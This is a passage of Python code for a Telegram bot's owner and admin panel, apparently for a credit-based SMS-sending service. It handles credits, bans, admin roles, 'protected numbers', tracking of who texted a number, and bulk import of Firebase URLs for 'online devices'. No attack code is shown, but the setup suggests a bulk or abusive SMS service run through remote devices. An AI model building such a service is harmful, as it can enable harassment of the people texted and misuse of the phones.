        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:protected_list")
async def owner_protected_list(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d) and not is_admin(uid, d):
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        try:
            await cq.message.edit_text(
                f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n\n<i>Koi number protected nahi hai.</i>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
                parse_mode="HTML"
            )
        except TelegramBadRequest:
            pass
        return
    lines = [f"{em(EMOJI_LOCK, '🔐')} <b>Protected Numbers List</b>\n"]
    is_owner_user = is_owner(uid, d) or is_main_owner(uid)
    for number, protector_uid in protected.items():
        display_number = number if is_owner_user else mask_number(number)
        protector_name = d.get("users", {}).get(str(protector_uid), {}).get("name", "Unknown")
        lines.append(f"{em(EMOJI_PHONE, '📞')} <code>{display_number}</code> — <code>{protector_uid}</code> ({protector_name})")
    rows = []
    if is_owner_user:
        rows.append([btn("ʀᴇᴍᴏᴠᴇ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ", "owner:protected_remove", EMOJI_CROSS, "🗑", style="danger")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    try:
        await cq.message.edit_text("\n".join(lines), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:protected_remove")
async def owner_protected_remove_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer()
        return
    protected = d.get("protected_numbers", {})
    if not protected:
        await cq.answer("❌ Koi protected number nahi hai!", show_alert=True)
        return
    await cq.answer()
    rows = [[btn(number, f"owner:protected_del:{number}", EMOJI_CROSS, "🗑", style="danger")] for number in protected]
    rows.append([btn("ʙᴀᴄᴋ", "owner:protected_list", EMOJI_GEAR, "🔙", style="primary")])
    try:
        await cq.message.edit_text(f"{em(EMOJI_CROSS, '🗑')} <b>Remove Protected Number</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:protected_del:"))
async def owner_protected_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer()
        return
    number = cq.data.split("owner:protected_del:", 1)[1]
    if number in d.get("protected_numbers", {}):
        del d["protected_numbers"][number]
        save(d)
        await cq.answer(f"✅ Protection removed for {number}!")
    else:
        await cq.answer()
    await owner_protected_list(cq, state)

@R.callback_query(F.data == "owner:track")
async def owner_track_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.track_number)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\nJis number ki tracking karni hai woh enter karo:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.track_number)
async def owner_track_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    number = msg.text.strip()
    await state.clear()
    users_who_sent = []
    for uid_str, history_list in d.get("sms_history", {}).items():
        for entry in history_list:
            if entry.get("number") == number:
                user_data = d.get("users", {}).get(uid_str, {})
                users_who_sent.append({"uid": int(uid_str), "name": user_data.get("name", "Unknown"), "timestamp": entry.get("timestamp", 0)})
                break
    if not users_who_sent:
        await msg.answer(
            f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n<code>{number}</code>\n\n<i>Is number pe kisi ne SMS nahi bheja.</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
            parse_mode="HTML"
        )
        return
    lines = [f"{em(EMOJI_STAR, '📊')} <b>Number Tracker</b>\n\n<code>{number}</code>\n"]
    for entry in users_who_sent:
        lines.append(f"• <code>{entry['uid']}</code> — {entry['name'][:20]} — {fmt_time(entry['timestamp'])}")
    await msg.answer(
        "\n".join(lines),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:add_all_credits")
async def owner_add_all_credits_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.add_all_credits_amount)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_MONEY, '💰')} <b>Add Credits to ALL Users</b>\n\nKitne credits dena hai?",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.add_all_credits_amount)
async def owner_add_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    await state.clear()
    users = d.get("users", {})
    for uid_str in users:
        add_credits(int(uid_str), amount, d)
    log_activity(d, "add_credits_all", uid, f"Added {amount} credits to {len(users)} users")
    save(d)

    sem = asyncio.Semaphore(20)
    success = 0
    lock = asyncio.Lock()

    async def notify(u_str: str):
        nonlocal success
        async with sem:
            try:
                await msg.bot.send_message(int(u_str), f"{em(EMOJI_GIFT, '🎉')} Aapko <b>{amount}</b> credits mile hain!", parse_mode="HTML")
                async with lock:
                    success += 1
            except Exception:
                pass

    await asyncio.gather(*(notify(u) for u in list(users.keys())))
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Added <b>{amount}</b> credits to <b>{len(users)}</b> users (Notified: <b>{success}</b>).",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:deduct_all_credits")
async def owner_deduct_all_credits_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.deduct_all_credits_amount)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits from ALL Users</b>\n\nKitne credits katne hain?",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.deduct_all_credits_amount)
async def owner_deduct_all_credits_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    await state.clear()
    count = 0
    total_deducted = 0
    for uid_str, udata in d.get("users", {}).items():
        user_id = int(uid_str)
        if is_owner(user_id, d) or user_id in d.get("admins", []):
            continue
        current = udata.get("credits", 0)
        ded = min(current, amount)
        if ded > 0:
            udata["credits"] = current - ded
            count += 1
            total_deducted += ded
    log_activity(d, "deduct_credits_all", uid, f"Deducted {total_deducted} credits from {count} users")
    save(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Deducted <b>{total_deducted}</b> total credits from <b>{count}</b> users.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:transfer")
async def user_transfer_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if is_banned(uid, d) or not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    current_credits = get_user_credits(uid, d)
    if current_credits < 2:
        await cq.answer("❌ Minimum 2 credits chahiye transfer ke liye!", show_alert=True)
        return
    await cq.answer()
    await state.set_state(S.transfer_credits_uid)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_MONEY, '💸')} <b>Transfer Credits</b>\n\nCredits: <b>{current_credits}</b> (Max half: <b>{current_credits // 2}</b>)\nJis user ko dena hai uska User ID bhejo:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "user:home", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.transfer_credits_uid)
async def user_transfer_uid(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        target_uid = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid User ID bhejo.", parse_mode="HTML")
        return
    if target_uid == uid or str(target_uid) not in d.get("users", {}):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid target User ID.", parse_mode="HTML")
        return
    await state.update_data(transfer_target=target_uid)
    await state.set_state(S.transfer_credits_amount)
    half = get_user_credits(uid, d) // 2
    await msg.answer(
        f"Kitne credits transfer karne hain? (Max <b>{half}</b>):",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "user:home", EMOJI_CROSS, "❌", style="danger")]]),
        parse_mode="HTML"
    )

@R.message(S.transfer_credits_amount)
async def user_transfer_amount(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    try:
        amount = int(msg.text.strip())
        if amount <= 0:
            raise ValueError
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return
    fsmd = await state.get_data()
    target_uid = fsmd.get("transfer_target")
    max_transfer = get_user_credits(uid, d) // 2
    if amount > max_transfer or not deduct_credits(uid, amount, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Max transfer limit: {max_transfer} credits.", parse_mode="HTML")
        return
    add_credits(target_uid, amount, d)
    log_activity(d, "credit_transfer", uid, f"Transferred {amount} credits to {target_uid}")
    save(d)
    await state.clear()
    try:
        await msg.bot.send_message(target_uid, f"{em(EMOJI_MONEY, '💸')} Aapko <code>{uid}</code> se <b>{amount}</b> credits mile hain!", parse_mode="HTML")
    except Exception:
        pass
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Transferred <b>{amount}</b> credits to <code>{target_uid}</code>!",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:home", "owner:refresh"}))
async def owner_home(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    try:
        await cq.message.edit_text(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.startswith("owner:fb:menu"))
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.clear()
    parts = cq.data.split(":")
    page = int(parts[3]) if len(parts) > 3 else 0
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\nTotal: <b>{len(d.get('firebases', []))}</b> firebase(s)",
            reply_markup=fb_menu_kb(d, page),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.add_firebase)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_FIRE, '🔥')} <b>Add Single Firebase</b>\n\n<i>Format: Label | URL\nExample: MyApp | https://myapp.firebaseio.com</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:fb:menu:0", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        label, url = [x.strip() for x in text.split("|", 1)]
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with http:// or https://.", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already added!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fbs.append({"id": str(int(time.time())), "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} <b>Firebase Added!</b>\n\n<code>{url}</code>", reply_markup=fb_menu_kb(load()), parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.add_firebase_file)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase via TXT File</b>\n\nEk <code>.txt</code> file bhejein jisme Firebase URLs hon.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:fb:menu:0", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    doc = msg.document
    if not doc.file_name.endswith(".txt"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf <code>.txt</code> file bhejein!", parse_mode="HTML")
        return
    file_info = await msg.bot.get_file(doc.file_id)
    downloaded_file = await msg.bot.download_file(file_info.file_path)
    content = downloaded_file.read().decode("utf-8", errors="ignore")

    fbs = d.get("firebases", [])
    existing_urls = {fb["url"].rstrip("/") for fb in fbs}
    added_count = 0
    skipped_count = 0

    for line in content.splitlines():
        line = line.strip()
        if not line:
            continue
        if "|" in line:
            label, url = [x.strip() for x in line.split("|", 1)]
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:20]
        if not url.startswith(("http://", "https://")):
            continue
        url = url.rstrip("/")
        if url in existing_urls:
            skipped_count += 1
            continue
        existing_urls.add(url)
        fbs.append({"id": str(int(time.time() * 1000) + random.randint(100, 999)), "url": url, "label": label, "added_at": int(time.time())})
        added_count += 1

    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>TXT Processed!</b>\n\nAdded: <b>{added_count}</b> | Skipped: <b>{skipped_count}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Kripya ek valid <code>.txt</code> file upload karein!", parse_mode="HTML")

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer()
        return
    parts = cq.data.split(":")
    fb_id = parts[3]
    page = int(parts[4]) if len(parts) > 4 else 0
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
    global CACHED_DEVICES, FB_DEVICE_COUNTS
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") != fb_id]
    FB_DEVICE_COUNTS.pop(fb_id, None)
    await cq.answer("🗑 Removed!")
    try:
        await cq.message.edit_text(f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>", reply_markup=fb_menu_kb(load(), page), parse_mode="HTML")
    except TelegramBadRequest:
        pass

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━"
    ]
    for fb_id, fb_stats in api_use.items():
        label = (fbs.get(fb_id, {}).get("label") or fb_id[:20]).replace("<", "&lt;").replace(">", "&gt;")
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}: {fb_stats.get('sent', 0)} sent / {fb_stats.get('failed', 0)} failed")
    return "\n".join(lines)

@R.callback_query(F.data == "owner:stats")
async def owner_stats_cb(cq: CallbackQuery, state: FSMContext):
    await cq.answer("🔄 Loading stats...")
    await state.clear()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    devices = get_cached_devices() or await get_all_online_devices(d)
    dev_lines = [f"\n{em(EMOJI_CHECK, '🟢')} <b>Online Devices ({len(devices)})</b>"] + [
        f"• <b>{dv['dev_name'][:20]}</b> ({dv['fb_label'][:20]})" for dv in devices
    ]
    full = (api_stats_text(d) + "\n" + "\n".join(dev_lines))[:3990]
    try:
        await cq.message.edit_text(
            full,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[
                btn("ʀᴇғʀᴇsʜ", "owner:stats", EMOJI_GEAR, "🔄", style="primary"),
                btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")
            ]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:owners:menu")
async def owner_owners_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕", style="success")])
    for oid in owners:
        if oid == MAIN_OWNER:
            rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑", style="primary")])
        else:
            rows.append([
                btn(f"{oid}", "noop", EMOJI_CROWN, "🔱", style="primary"),
                btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑", style="danger")
            ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    try:
        await cq.message.edit_text(f"{em(EMOJI_CROWN, '👑')} <b>Super Admins ({len(owners)}/6)</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:owners:add")
async def owner_owners_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d) or len(d.get("owners", [])) >= 6:
        await cq.answer("🚫 Not allowed / Limit reached!", show_alert=True)
        return
    await cq.answer()
    await state.set_state(S.add_owner)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_CROWN, '👑')} <b>Add Super Admin</b>\n\nChat ID bhejo:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:owners:menu", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.add_owner)
async def owner_owners_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid Chat ID bhejo.", parse_mode="HTML")
        return
    if new_id not in d["owners"] and len(d["owners"]) < 6:
        d["owners"].append(new_id)
        save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Added <code>{new_id}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:owners:menu", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:owners:del:"))
async def owner_owners_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    del_id = int(cq.data.split("owner:owners:del:", 1)[1])
    if not is_owner(cq.from_user.id, d) or del_id == MAIN_OWNER or del_id in SUPER_ADMINS:
        await cq.answer("🚫 Cannot remove!", show_alert=True)
        return
    await cq.answer()
    if del_id in d["owners"]:
        d["owners"].remove(del_id)
        save(d)
    await owner_owners_menu(cq, state)

@R.callback_query(F.data == "owner:admins:menu")
async def owner_admins_menu(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕", style="success")]]
    for aid in admins:
        rows.append([
            btn(f"{aid}", "noop", EMOJI_SHIELD, "🛡", style="primary"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑", style="danger")
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙", style="primary")])
    try:
        await cq.message.edit_text(f"{em(EMOJI_SHIELD, '🛡')} <b>Admins ({len(admins)})</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data == "owner:admins:add")
async def owner_admins_add_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    if not is_owner(cq.from_user.id, load()):
        return
    await state.set_state(S.add_admin)
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_SHIELD, '🛡')} <b>Add Admin</b>\n\nUser ID bhejo:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", "owner:admins:menu", EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.add_admin)
async def owner_admins_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        new_id = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if new_id not in d["admins"] and not is_owner(new_id, d):
        d["admins"].append(new_id)
        save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Admin Added: <code>{new_id}</code>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ʙᴀᴄᴋ", "owner:admins:menu", EMOJI_GEAR, "🔙", style="primary")]]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:admins:del:"))
async def owner_admins_del(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    del_id = int(cq.data.split("owner:admins:del:", 1)[1])
    if is_owner(cq.from_user.id, d) and del_id in d["admins"]:
        d["admins"].remove(del_id)
        save(d)
    await owner_admins_menu(cq, state)

@R.callback_query(F.data.in_({"owner:free:on", "owner:free:off"}))
async def owner_free_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer()
        return
    d["free_mode"] = (cq.data == "owner:free:on")
    save(d)
    await cq.answer("Updated!")
    try:
        await cq.message.edit_text(owner_panel_text(load()), reply_markup=owner_kb(load()), parse_mode="HTML")
    except TelegramBadRequest:
        pass

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple[str, InlineKeyboardMarkup]:
    items = list(d.get("users", {}).items())
    per = 10
    chunk = items[page * per:page * per + per]
    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)})</b>\n"]
    for uid_str, udata in chunk:
        lines.append(f"• <code>{uid_str}</code> — {udata.get('name', 'Unknown')[:18]} | 💰{udata.get('credits', 0)} | 📤{udata.get('uses', 0)}")
    rows = []
    nav = []
    if page > 0:
        nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️", style="primary"))
    if (page + 1) * per < len(items):
        nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️", style="primary"))
    if nav:
        rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    return "\n".join(lines), InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.in_({"owner:users:list", "admin:users:list"}))
async def panel_users_list(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    text, markup = users_list_kb(d, prefix, 0)
    try:
        await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.regexp(r"^(owner|admin):users:pg:(\d+)$"))
async def panel_users_page(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    parts = cq.data.split(":")
    text, markup = users_list_kb(d, parts[0], int(parts[3]))
    try:
        await cq.message.edit_text(text, reply_markup=markup, parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"owner:ban", "admin:ban"}))
async def panel_ban_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    await state.set_state(S.ban_user)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    try:
        await cq.message.edit_text(
            f"{em(EMOJI_CROSS, '🚫')} <b>Ban User</b>\n\nUser ID bhejo:",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[btn("ᴄᴀɴᴄᴇʟ", back, EMOJI_CROSS, "❌", style="danger")]]),
            parse_mode="HTML"
        )
    except TelegramBadRequest:
        pass

@R.message(S.ban_user)
async def panel_ban_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        ban_id = int(msg.text.strip())
    except Exception:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    if not is_owner(ban_id, d) and not is_admin(ban_id, d) and ban_id not in d["banned"]:
        d["banned"].append(ban_id)
        save(d)
    await state.clear()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(f"{em(EMOJI_CROSS, '🚫')} Ban ho gaya: <code>{ban_id}</code>", reply_markup=back_kb, parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:unban:menu", "admin:unban:menu"}))
async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer()
        return
    banned = d.get("banned", [])
    if not banned:
        await cq.answer("✅ Koi banned nahi!", show_alert=True)
        return
    await cq.answer()
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    rows = [[btn(str(bid), f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓", style="success")] for bid in banned]
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙", style="primary")])
    try:
        await cq.message.edit_text(f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    ban_id = int(cq.data.split(":")[-1])
    if is_admin(cq.from_user.id, d) and ban_id in d["banned"]:
        d["banned"].remove(ban_id)
        save(d)
    await cq.answer(f"✅ {ban_id} unban ho gaya!")
    is_own = is_owner(cq.from_user.id, d)
    try:
        await cq.message.edit_text(owner_panel_text(d) if is_own else admin_panel_text(d), reply_markup=owner_kb(d) if is_own else admin_kb(d), parse_mode="HTML")
    except TelegramBadRequest:
        pass

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    await cq.answer()
    d = load()
    if not is_admin(cq.from_user.id, d):
        return
    await state.set_state(S.broadcast)
